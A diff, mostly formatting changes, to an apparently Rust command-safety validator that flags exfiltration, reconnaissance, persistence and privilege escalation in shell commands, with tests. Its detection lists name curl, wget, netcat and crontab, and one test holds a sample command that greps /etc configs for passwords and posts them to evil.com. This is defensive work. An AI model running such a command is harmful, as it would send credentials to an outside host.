@@ -36,14 +36,14 @@
 //! # }
 //! ```
 
+use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::sync::Arc;
 use std::time::{SystemTime, UNIX_EPOCH};
 use tokio::sync::RwLock;
-use serde::{Deserialize, Serialize};
 
+use super::{SafetyConfig, SafetyValidator, ValidationError, ValidationResult};
 use crate::models::{RiskLevel, ShellType};
-use super::{SafetyValidator, SafetyConfig, ValidationResult, ValidationError};
 
 /// Advanced threat levels beyond basic risk assessment
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
@@ -187,7 +187,7 @@ impl AdvancedSafetyConfig {
             enable_context_analysis: true,
             enable_threat_intel: false, // User must explicitly enable
             enable_adaptive_learning: true,
-            max_analysis_time_ms: 3000, // Faster for production
+            max_analysis_time_ms: 3000,   // Faster for production
             ml_confidence_threshold: 0.8, // Higher threshold
             enable_chain_analysis: true,
             max_chain_length: 15,
@@ -202,8 +202,8 @@ impl AdvancedSafetyConfig {
             enable_context_analysis: true,
             enable_threat_intel: false,
             enable_adaptive_learning: false, // No learning in dev
-            max_analysis_time_ms: 10000, // More time for detailed analysis
-            ml_confidence_threshold: 0.6, // Lower threshold for dev
+            max_analysis_time_ms: 10000,     // More time for detailed analysis
+            ml_confidence_threshold: 0.6,    // Lower threshold for dev
             enable_chain_analysis: true,
             max_chain_length: 20,
         }
@@ -223,8 +223,8 @@ struct LearnedPattern {
 /// User feedback on command safety assessments
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub enum UserFeedback {
-    Approved,     // User confirmed command was safe
-    Rejected,     // User confirmed command was dangerous
+    Approved,      // User confirmed command was safe
+    Rejected,      // User confirmed command was dangerous
     FalsePositive, // User said safe command was flagged incorrectly
     FalseNegative, // User reported dangerous command was missed
 }
@@ -256,7 +256,7 @@ impl AdvancedSafetyValidator {
     /// Create new advanced safety validator
     pub async fn new(config: AdvancedSafetyConfig) -> Result<Self, ValidationError> {
         let base_validator = SafetyValidator::new(config.base_config.clone())?;
-        
+
         Ok(Self {
             base_validator,
             config,
@@ -274,17 +274,23 @@ impl AdvancedSafetyValidator {
         context: Option<&ValidationContext>,
     ) -> Result<AdvancedValidationResult, ValidationError> {
         #[cfg(test)]
-        println!("AdvancedSafetyValidator::analyze_command called with: '{}'", command);
-        
-        let start_time = SystemTime::now().duration_since(UNIX_EPOCH)
-            .unwrap_or_default().as_millis() as u64;
+        println!(
+            "AdvancedSafetyValidator::analyze_command called with: '{}'",
+            command
+        );
+
+        let start_time = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_millis() as u64;
 
         // Check cache first (disabled in test mode for learning tests)
         #[cfg(not(test))]
         {
             let cache_key = self.generate_cache_key(command, &shell, context);
             if let Some((cached_result, cache_time)) = self.get_cached_result(&cache_key).await {
-                if start_time.saturating_sub(cache_time) < 300000 { // 5 minutes cache
+                if start_time.saturating_sub(cache_time) < 300000 {
+                    // 5 minutes cache
                     return Ok(cached_result);
                 }
             }
@@ -292,7 +298,7 @@ impl AdvancedSafetyValidator {
 
         // Start with basic pattern-based validation
         let basic_result = self.base_validator.validate_command(command, shell).await?;
-        
+
         // Initialize advanced result
         let mut result = AdvancedValidationResult {
             basic_result: basic_result.clone(),
@@ -308,14 +314,27 @@ impl AdvancedSafetyValidator {
 
         // ML-based behavioral analysis
         if self.config.enable_ml_analysis {
-            self.analyze_behavioral_patterns(command, &mut result).await?;
+            self.analyze_behavioral_patterns(command, &mut result)
+                .await?;
         }
 
         // If basic patterns detected privilege escalation but didn't set High threat, escalate
-        if result.basic_result.matched_patterns.iter().any(|p| p.contains("root") || p.contains("privilege")) {
-            if !result.behavioral_patterns.contains(&BehavioralPattern::PrivilegeEscalation) {
-                result.behavioral_patterns.push(BehavioralPattern::PrivilegeEscalation);
-                result.behavioral_warnings.push("Privilege escalation detected".to_string());
+        if result
+            .basic_result
+            .matched_patterns
+            .iter()
+            .any(|p| p.contains("root") || p.contains("privilege"))
+        {
+            if !result
+                .behavioral_patterns
+                .contains(&BehavioralPattern::PrivilegeEscalation)
+            {
+                result
+                    .behavioral_patterns
+                    .push(BehavioralPattern::PrivilegeEscalation);
+                result
+                    .behavioral_warnings
+                    .push("Privilege escalation detected".to_string());
             }
         }
 
@@ -329,7 +348,10 @@ impl AdvancedSafetyValidator {
         // Check learned patterns
         if self.config.enable_adaptive_learning {
             #[cfg(test)]
-            println!("Checking learned patterns (enabled: {})", self.config.enable_adaptive_learning);
+            println!(
+                "Checking learned patterns (enabled: {})",
+                self.config.enable_adaptive_learning
+            );
             self.check_learned_patterns(command, &mut result).await?;
         }
 
@@ -340,15 +362,18 @@ impl AdvancedSafetyValidator {
         self.generate_recommendations(&mut result);
 
         // Record analysis time
-        let end_time = SystemTime::now().duration_since(UNIX_EPOCH)
-            .unwrap_or_default().as_millis() as u64;
+        let end_time = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_millis() as u64;
         result.analysis_time_ms = end_time.saturating_sub(start_time);
 
         // Cache result (disabled in test mode)
         #[cfg(not(test))]
         {
             let cache_key = self.generate_cache_key(command, &shell, context);
-            self.cache_result(cache_key, result.clone(), start_time).await;
+            self.cache_result(cache_key, result.clone(), start_time)
+                .await;
         }
 
         // Update statistics
@@ -364,7 +389,9 @@ impl AdvancedSafetyValidator {
         shell: ShellType,
     ) -> Result<AdvancedValidationResult, ValidationError> {
         if !self.config.enable_chain_analysis || commands.is_empty() {
-            return self.analyze_command(commands.get(0).unwrap_or(&""), shell, None).await;
+            return self
+                .analyze_command(commands.get(0).unwrap_or(&""), shell, None)
+                .await;
         }
 
         let chain_limited = if commands.len() > self.config.max_chain_length {
@@ -381,7 +408,8 @@ impl AdvancedSafetyValidator {
         }
 
         // Combine results and look for chain patterns
-        let mut chain_result = individual_results.into_iter()
+        let mut chain_result = individual_results
+            .into_iter()
             .max_by(|a, b| a.threat_level.cmp(&b.threat_level))
             .unwrap_or_else(|| AdvancedValidationResult {
                 basic_result: ValidationResult {
@@ -403,7 +431,8 @@ impl AdvancedSafetyValidator {
             });
 
         // Analyze chain-specific patterns
-        self.analyze_chain_patterns(chain_limited, &mut chain_result).await?;
+        self.analyze_chain_patterns(chain_limited, &mut chain_result)
+            .await?;
 
         Ok(chain_result)
     }
@@ -420,9 +449,11 @@ impl AdvancedSafetyValidator {
 
         let signature = self.generate_command_signature(command);
         let mut learned = self.learned_patterns.write().await;
-        
-        let timestamp = SystemTime::now().duration_since(UNIX_EPOCH)
-            .unwrap_or_default().as_secs();
+
+        let timestamp = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_secs();
 
         if let Some(pattern) = learned.get_mut(&signature) {
             pattern.user_feedback = feedback;
@@ -430,13 +461,16 @@ impl AdvancedSafetyValidator {
             pattern.last_seen = timestamp;
             pattern.confidence = self.calculate_learning_confidence(pattern);
         } else {
-            learned.insert(signature.clone(), LearnedPattern {
-                command_signature: signature,
-                user_feedback: feedback,
-                frequency: 1,
-                last_seen: timestamp,
-                confidence: 0.8, // Higher initial confidence for immediate feedback
-            });
+            learned.insert(
+                signature.clone(),
+                LearnedPattern {
+                    command_signature: signature,
+                    user_feedback: feedback,
+                    frequency: 1,
+                    last_seen: timestamp,
+                    confidence: 0.8, // Higher initial confidence for immediate feedback
+                },
+            );
         }
 
         Ok(())
@@ -456,23 +490,37 @@ impl AdvancedSafetyValidator {
     ) -> Result<(), ValidationError> {
         // Placeholder for ML-based behavioral analysis
         // In a real implementation, this would use trained models
-        
+
         // Simple heuristic-based behavioral detection for now
         if self.detect_data_exfiltration(command) {
-            result.behavioral_patterns.push(BehavioralPattern::DataExfiltration);
-            result.behavioral_warnings.push("Potential data exfiltration detected".to_string());
-            result.ml_scores.insert("data_exfiltration".to_string(), 0.85);
+            result
+                .behavioral_patterns
+                .push(BehavioralPattern::DataExfiltration);
+            result
+                .behavioral_warnings
+                .push("Potential data exfiltration detected".to_string());
+            result
+                .ml_scores
+                .insert("data_exfiltration".to_string(), 0.85);
         }
 
         if self.detect_reconnaissance(command) {
-            result.behavioral_patterns.push(BehavioralPattern::SystemReconnaissance);
-            result.behavioral_warnings.push("System reconnaissance activity detected".to_string());
+            result
+                .behavioral_patterns
+                .push(BehavioralPattern::SystemReconnaissance);
+            result
+                .behavioral_warnings
+                .push("System reconnaissance activity detected".to_string());
             result.ml_scores.insert("reconnaissance".to_string(), 0.75);
         }
 
         if self.detect_persistence(command) {
-            result.behavioral_patterns.push(BehavioralPattern::PersistenceMechanism);
-            result.behavioral_warnings.push("Persistence mechanism detected".to_string());
+            result
+                .behavioral_patterns
+                .push(BehavioralPattern::PersistenceMechanism);
+            result
+                .behavioral_warnings
+                .push("Persistence mechanism detected".to_string());
             result.ml_scores.insert("persistence".to_string(), 0.80);
         }
 
@@ -487,30 +535,31 @@ impl AdvancedSafetyValidator {
     ) -> Result<(), ValidationError> {
         // Analyze based on current working directory
         if context.cwd.contains("/tmp") && command.contains("chmod +x") {
-            result.contextual_warnings.push(
-                "Making files executable in temporary directory".to_string()
-            );
+            result
+                .contextual_warnings
+                .push("Making files executable in temporary directory".to_string());
         }
 
         // Analyze based on user privileges
-        if context.user_privileges.is_root && result.basic_result.risk_level >= RiskLevel::Moderate {
-            result.contextual_warnings.push(
-                "Potentially dangerous command executed as root".to_string()
-            );
+        if context.user_privileges.is_root && result.basic_result.risk_level >= RiskLevel::Moderate
+        {
+            result
+                .contextual_warnings
+                .push("Potentially dangerous command executed as root".to_string());
         }
 
         // Analyze based on command history
         if self.detect_suspicious_sequence(&context.command_history, command) {
-            result.contextual_warnings.push(
-                "Command follows suspicious pattern in history".to_string()
-            );
+            result
+                .contextual_warnings
+                .push("Command follows suspicious pattern in history".to_string());
         }
 
         // Analyze based on system metrics
         if context.system_metrics.cpu_usage > 90.0 && command.contains("find") {
-            result.contextual_warnings.push(
-                "Resource-intensive command during high CPU usage".to_string()
-            );
+            result
+                .contextual_warnings
+                .push("Resource-intensive command during high CPU usage".to_string());
         }
 
         Ok(())
@@ -522,15 +571,19 @@ impl AdvancedSafetyValidator {
         result: &mut AdvancedValidationResult,
     ) -> Result<(), ValidationError> {
         // Look for common attack patterns in command chains
-        
+
         // Data collection -> exfiltration pattern
         let has_find = commands.iter().any(|c| c.contains("find"));
-        let has_network = commands.iter().any(|c| c.contains("curl") || c.contains("wget"));
-        
+        let has_network = commands
+            .iter()
+            .any(|c| c.contains("curl") || c.contains("wget"));
+
         if has_find && has_network {
-            result.behavioral_patterns.push(BehavioralPattern::DataExfiltration);
+            result
+                .behavioral_patterns
+                .push(BehavioralPattern::DataExfiltration);
             result.behavioral_warnings.push(
-                "Command chain shows data collection followed by network activity".to_string()
+                "Command chain shows data collection followed by network activity".to_string(),
             );
         }
 
@@ -538,12 +591,16 @@ impl AdvancedSafetyValidator {
         let has_recon = commands.iter().any(|c| {
             c.contains("whoami") || c.contains("id") || c.contains("uname") || c.contains("ps")
         });
-        let has_priv_esc = commands.iter().any(|c| c.contains("sudo") || c.contains("su"));
-        
+        let has_priv_esc = commands
+            .iter()
+            .any(|c| c.contains("sudo") || c.contains("su"));
+
         if has_recon && has_priv_esc {
-            result.behavioral_patterns.push(BehavioralPattern::PrivilegeEscalation);
+            result
+                .behavioral_patterns
+                .push(BehavioralPattern::PrivilegeEscalation);
             result.behavioral_warnings.push(
-                "Command chain shows reconnaissance followed by privilege escalation".to_string()
+                "Command chain shows reconnaissance followed by privilege escalation".to_string(),
             );
         }
 
@@ -557,40 +614,49 @@ impl AdvancedSafetyValidator {
     ) -> Result<(), ValidationError> {
         let signature = self.generate_command_signature(command);
         let learned = self.learned_patterns.read().await;
-        
+
         // Debug: show what we're looking for
         #[cfg(test)]
-        println!("Looking for signature: '{}', learned patterns: {:?}", signature, learned.keys().collect::<Vec<_>>());
-        
+        println!(
+            "Looking for signature: '{}', learned patterns: {:?}",
+            signature,
+            learned.keys().collect::<Vec<_>>()
+        );
+
         if let Some(pattern) = learned.get(&signature) {
             match pattern.user_feedback {
                 UserFeedback::Approved => {
-                    result.recommendations.push(
-                        "Previously approved by user - consider allowing".to_string()
-                    );
+                    result
+                        .recommendations
+                        .push("Previously approved by user - consider allowing".to_string());
                     if pattern.confidence > self.config.ml_confidence_threshold {
-                        result.ml_scores.insert("user_approval".to_string(), pattern.confidence);
+                        result
+                            .ml_scores
+                            .insert("user_approval".to_string(), pattern.confidence);
                     }
                 }
                 UserFeedback::Rejected => {
-                    result.recommendations.push(
-                        "Previously rejected by user - recommend blocking".to_string()
-                    );
+                    result
+                        .recommendations
+                        .push("Previously rejected by user - recommend blocking".to_string());
                     result.threat_level = std::cmp::max(result.threat_level, ThreatLevel::High);
                     if pattern.confidence > self.config.ml_confidence_threshold {
-                        result.ml_scores.insert("user_rejection".to_string(), pattern.confidence);
+                        result
+                            .ml_scores
+                            .insert("user_rejection".to_string(), pattern.confidence);
                     }
                 }
                 UserFeedback::FalsePositive => {
                     result.recommendations.push(
-                        "Previously flagged as false positive - reduce sensitivity".to_string()
+                        "Previously flagged as false positive - reduce sensitivity".to_string(),
                     );
                 }
                 UserFeedback::FalseNegative => {
                     result.recommendations.push(
-                        "Previously reported as missed threat - increase scrutiny".to_string()
+                        "Previously reported as missed threat - increase scrutiny".to_string(),
                     );
-                    result.threat_level = std::cmp::max(result.threat_level, ThreatLevel::Concerning);
+                    result.threat_level =
+                        std::cmp::max(result.threat_level, ThreatLevel::Concerning);
                 }
             }
         }
@@ -600,14 +666,26 @@ impl AdvancedSafetyValidator {
 
     fn calculate_threat_level(&self, result: &AdvancedValidationResult) -> ThreatLevel {
         let base_level = ThreatLevel::from(result.basic_result.risk_level);
-        
+
         // Escalate based on behavioral patterns
-        let behavioral_escalation = if result.behavioral_patterns.contains(&BehavioralPattern::DataExfiltration) ||
-                                   result.behavioral_patterns.contains(&BehavioralPattern::Destruction) ||
-                                   result.behavioral_patterns.contains(&BehavioralPattern::Ransomware) {
+        let behavioral_escalation = if result
+            .behavioral_patterns
+            .contains(&BehavioralPattern::DataExfiltration)
+            || result
+                .behavioral_patterns
+                .contains(&BehavioralPattern::Destruction)
+            || result
+                .behavioral_patterns
+                .contains(&BehavioralPattern::Ransomware)
+        {
             ThreatLevel::Critical
-        } else if result.behavioral_patterns.contains(&BehavioralPattern::PrivilegeEscalation) ||
-                  result.behavioral_patterns.contains(&BehavioralPattern::PersistenceMechanism) {
+        } else if result
+            .behavioral_patterns
+            .contains(&BehavioralPattern::PrivilegeEscalation)
+            || result
+                .behavioral_patterns
+                .contains(&BehavioralPattern::PersistenceMechanism)
+        {
             ThreatLevel::High
         } else {
             match result.behavioral_patterns.len() {
@@ -641,30 +719,52 @@ impl AdvancedSafetyValidator {
         };
 
         // Take the highest threat level
-        std::cmp::max(base_level, std::cmp::max(behavioral_escalation, std::cmp::max(ml_escalation, context_escalation)))
+        std::cmp::max(
+            base_level,
+            std::cmp::max(
+                behavioral_escalation,
+                std::cmp::max(ml_escalation, context_escalation),
+            ),
+        )
     }
 
     fn generate_recommendations(&self, result: &mut AdvancedValidationResult) {
         match result.threat_level {
             ThreatLevel::Critical => {
-                result.recommendations.push("Block command immediately".to_string());
-                result.recommendations.push("Consider system security audit".to_string());
+                result
+                    .recommendations
+                    .push("Block command immediately".to_string());
+                result
+                    .recommendations
+                    .push("Consider system security audit".to_string());
                 result.requires_monitoring = true;
             }
             ThreatLevel::High => {
-                result.recommendations.push("Require explicit user confirmation".to_string());
-                result.recommendations.push("Log command for security review".to_string());
+                result
+                    .recommendations
+                    .push("Require explicit user confirmation".to_string());
+                result
+                    .recommendations
+                    .push("Log command for security review".to_string());
                 result.requires_monitoring = true;
             }
             ThreatLevel::Concerning => {
-                result.recommendations.push("Warn user about potential risks".to_string());
-                result.recommendations.push("Monitor execution if allowed".to_string());
+                result
+                    .recommendations
+                    .push("Warn user about potential risks".to_string());
+                result
+                    .recommendations
+                    .push("Monitor execution if allowed".to_string());
             }
             ThreatLevel::Suspicious => {
-                result.recommendations.push("Consider additional verification".to_string());
+                result
+                    .recommendations
+                    .push("Consider additional verification".to_string());
             }
             ThreatLevel::Safe => {
-                result.recommendations.push("Allow with normal monitoring".to_string());
+                result
+                    .recommendations
+                    .push("Allow with normal monitoring".to_string());
             }
         }
     }
@@ -673,47 +773,62 @@ impl AdvancedSafetyValidator {
 
     fn detect_data_exfiltration(&self, command: &str) -> bool {
         let cmd_lower = command.to_lowercase();
-        
+
         // Data collection commands
-        let has_data_collection = cmd_lower.contains("find") || cmd_lower.contains("grep") || 
-                                 cmd_lower.contains("cat") || cmd_lower.contains("head") ||
-                                 cmd_lower.contains("tail") || cmd_lower.contains("awk") ||
-                                 cmd_lower.contains("sed");
-        
+        let has_data_collection = cmd_lower.contains("find")
+            || cmd_lower.contains("grep")
+            || cmd_lower.contains("cat")
+            || cmd_lower.contains("head")
+            || cmd_lower.contains("tail")
+            || cmd_lower.contains("awk")
+            || cmd_lower.contains("sed");
+
         // Network transfer commands
-        let has_network_transfer = cmd_lower.contains("curl") || cmd_lower.contains("wget") || 
-                                  cmd_lower.contains("scp") || cmd_lower.contains("nc ") ||
-                                  cmd_lower.contains("netcat");
-        
+        let has_network_transfer = cmd_lower.contains("curl")
+            || cmd_lower.contains("wget")
+            || cmd_lower.contains("scp")
+            || cmd_lower.contains("nc ")
+            || cmd_lower.contains("netcat");
+
         // Pipe data to network
-        let has_pipe_to_network = (cmd_lower.contains("|") && has_network_transfer) ||
-                                 cmd_lower.contains("--data") || cmd_lower.contains("--post");
-        
+        let has_pipe_to_network = (cmd_lower.contains("|") && has_network_transfer)
+            || cmd_lower.contains("--data")
+            || cmd_lower.contains("--post");
+
         (has_data_collection && has_network_transfer) || has_pipe_to_network
     }
 
     fn detect_reconnaissance(&self, command: &str) -> bool {
         let cmd_lower = command.to_lowercase();
-        cmd_lower.contains("whoami") || cmd_lower.contains("uname") || 
-        cmd_lower.contains("ps aux") || cmd_lower.contains("netstat") ||
-        cmd_lower.contains("lsof") || cmd_lower.contains("ss -")
+        cmd_lower.contains("whoami")
+            || cmd_lower.contains("uname")
+            || cmd_lower.contains("ps aux")
+            || cmd_lower.contains("netstat")
+            || cmd_lower.contains("lsof")
+            || cmd_lower.contains("ss -")
     }
 
     fn detect_persistence(&self, command: &str) -> bool {
         let cmd_lower = command.to_lowercase();
-        cmd_lower.contains("crontab") || cmd_lower.contains("systemctl enable") ||
-        cmd_lower.contains("~/.bash") || cmd_lower.contains("/etc/rc")
+        cmd_lower.contains("crontab")
+            || cmd_lower.contains("systemctl enable")
+            || cmd_lower.contains("~/.bash")
+            || cmd_lower.contains("/etc/rc")
     }
 
     fn detect_suspicious_sequence(&self, history: &[String], current: &str) -> bool {
         if history.len() < 2 {
             return false;
         }
-        
+
         // Look for recon followed by network activity
-        let recent_recon = history.iter().rev().take(3).any(|cmd| self.detect_reconnaissance(cmd));
+        let recent_recon = history
+            .iter()
+            .rev()
+            .take(3)
+            .any(|cmd| self.detect_reconnaissance(cmd));
         let current_network = current.contains("curl") || current.contains("wget");
-        
+
         recent_recon && current_network
     }
 
@@ -725,10 +840,15 @@ impl AdvancedSafetyValidator {
         shell: &ShellType,
         context: Option<&ValidationContext>,
     ) -> String {
-        let context_hash = context.map(|c| {
-            format!("{}{}{}", c.cwd, c.user_privileges.effective_uid, c.network_available)
-        }).unwrap_or_default();
-        
+        let context_hash = context
+            .map(|c| {
+                format!(
+                    "{}{}{}",
+                    c.cwd, c.user_privileges.effective_uid, c.network_available
+                )
+            })
+            .unwrap_or_default();
+
         format!("{}:{}:{}", command, format!("{:?}", shell), context_hash)
     }
 
@@ -739,7 +859,7 @@ impl AdvancedSafetyValidator {
     async fn cache_result(&self, key: String, result: AdvancedValidationResult, timestamp: u64) {
         let mut cache = self.analysis_cache.write().await;
         cache.insert(key, (result, timestamp));
-        
+
         // Simple cache cleanup - remove entries older than 1 hour
         let cutoff = timestamp.saturating_sub(3600000);
         cache.retain(|_, (_, ts)| *ts > cutoff);
@@ -750,25 +870,25 @@ impl AdvancedSafetyValidator {
     fn generate_command_signature(&self, command: &str) -> String {
         // Normalize command for learning (remove specific paths, IPs, etc.)
         let mut normalized = command.to_lowercase();
-        
+
         // Remove IP addresses
         normalized = regex::Regex::new(r"\d+\.\d+\.\d+\.\d+")
             .unwrap()
             .replace_all(&normalized, "[IP]")
             .to_string();
-        
+
         // Remove file paths
         normalized = regex::Regex::new(r"/[^\s]+")
             .unwrap()
             .replace_all(&normalized, "[PATH]")
             .to_string();
-        
+
         // Remove numbers (PIDs, ports, etc.)
         normalized = regex::Regex::new(r"\b\d+\b")
             .unwrap()
             .replace_all(&normalized, "[NUM]")
             .to_string();
-        
+
         normalized
     }
 
@@ -776,31 +896,35 @@ impl AdvancedSafetyValidator {
         // Simple confidence calculation based on frequency and time
         let frequency_score = (pattern.frequency as f32).min(10.0) / 10.0;
         let time_decay = if pattern.last_seen > 0 {
-            let age_days = (SystemTime::now().duration_since(UNIX_EPOCH)
-                .unwrap_or_default().as_secs().saturating_sub(pattern.last_seen)) / 86400;
+            let age_days = (SystemTime::now()
+                .duration_since(UNIX_EPOCH)
+                .unwrap_or_default()
+                .as_secs()
+                .saturating_sub(pattern.last_seen))
+                / 86400;
             (-0.1 * age_days as f32).exp().max(0.1)
         } else {
             1.0
         };
-        
+
         (frequency_score * time_decay).min(1.0)
     }
 
     async fn update_statistics(&self, result: &AdvancedValidationResult) {
         let mut stats = self.execution_stats.write().await;
         stats.total_commands += 1;
-        
+
         // Consider command blocked if basic result blocks it OR advanced threat level is Critical/High
         if !result.basic_result.allowed || result.threat_level >= ThreatLevel::High {
             stats.blocked_commands += 1;
         }
-        
+
         // Update rolling average of analysis time
         let n = stats.total_commands as f64;
         if n == 1.0 {
             stats.average_analysis_time_ms = result.analysis_time_ms as f64;
         } else {
-            stats.average_analysis_time_ms = 
+            stats.average_analysis_time_ms =
                 ((n - 1.0) * stats.average_analysis_time_ms + result.analysis_time_ms as f64) / n;
         }
     }
@@ -821,14 +945,16 @@ mod tests {
     async fn test_behavioral_pattern_detection() {
         let config = AdvancedSafetyConfig::development();
         let validator = AdvancedSafetyValidator::new(config).await.unwrap();
-        
+
         let result = validator.analyze_command(
             "find /etc -name '*.conf' | xargs grep password | curl -X POST --data-binary @- http://evil.com",
             ShellType::Bash,
             None
         ).await.unwrap();
-        
-        assert!(result.behavioral_patterns.contains(&BehavioralPattern::DataExfiltration));
+
+        assert!(result
+            .behavioral_patterns
+            .contains(&BehavioralPattern::DataExfiltration));
         assert!(result.threat_level >= ThreatLevel::High);
     }
 
@@ -836,17 +962,17 @@ mod tests {
     async fn test_command_chain_analysis() {
         let config = AdvancedSafetyConfig::production();
         let validator = AdvancedSafetyValidator::new(config).await.unwrap();
-        
-        let commands = [
-            "whoami",
-            "uname -a",
-            "ps aux",
-            "sudo su -"
-        ];
-        
-        let result = validator.analyze_command_chain(&commands, ShellType::Bash).await.unwrap();
-        
-        assert!(result.behavioral_patterns.contains(&BehavioralPattern::PrivilegeEscalation));
+
+        let commands = ["whoami", "uname -a", "ps aux", "sudo su -"];
+
+        let result = validator
+            .analyze_command_chain(&commands, ShellType::Bash)
+            .await
+            .unwrap();
+
+        assert!(result
+            .behavioral_patterns
+            .contains(&BehavioralPattern::PrivilegeEscalation));
         assert!(result.threat_level >= ThreatLevel::High);
     }
 
@@ -854,24 +980,33 @@ mod tests {
     async fn test_user_feedback_learning() {
         let config = AdvancedSafetyConfig::default();
         let validator = AdvancedSafetyValidator::new(config).await.unwrap();
-        
+
         let command = "rm temp_file.txt";
-        
+
         // Record that user approved this command
-        validator.record_feedback(command, UserFeedback::Approved).await.unwrap();
-        
+        validator
+            .record_feedback(command, UserFeedback::Approved)
+            .await
+            .unwrap();
+
         // Analyze the same command again
-        let result = validator.analyze_command(command, ShellType::Bash, None).await.unwrap();
-        
+        let result = validator
+            .analyze_command(command, ShellType::Bash, None)
+            .await
+            .unwrap();
+
         // Should have recommendation based on user feedback
-        assert!(result.recommendations.iter().any(|r| r.contains("approved")));
+        assert!(result
+            .recommendations
+            .iter()
+            .any(|r| r.contains("approved")));
     }
 
     #[tokio::test]
     async fn test_context_aware_analysis() {
         let config = AdvancedSafetyConfig::production();
         let validator = AdvancedSafetyValidator::new(config).await.unwrap();
-        
+
         let context = ValidationContext {
             cwd: "/tmp".to_string(),
             environment: HashMap::new(),
@@ -889,16 +1024,25 @@ mod tests {
                 disk_usage: 70.0,
                 active_connections: 10,
             },
-            timestamp: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
+            timestamp: SystemTime::now()
+                .duration_since(UNIX_EPOCH)
+                .unwrap()
+                .as_secs(),
         };
-        
-        let result = validator.analyze_command(
-            "chmod +x suspicious_script.sh",
-            ShellType::Bash,
-            Some(&context)
-        ).await.unwrap();
-        
+
+        let result = validator
+            .analyze_command(
+                "chmod +x suspicious_script.sh",
+                ShellType::Bash,
+                Some(&context),
+            )
+            .await
+            .unwrap();
+
         assert!(!result.contextual_warnings.is_empty());
-        assert!(result.contextual_warnings.iter().any(|w| w.contains("temporary directory")));
+        assert!(result
+            .contextual_warnings
+            .iter()
+            .any(|w| w.contains("temporary directory")));
     }
 }
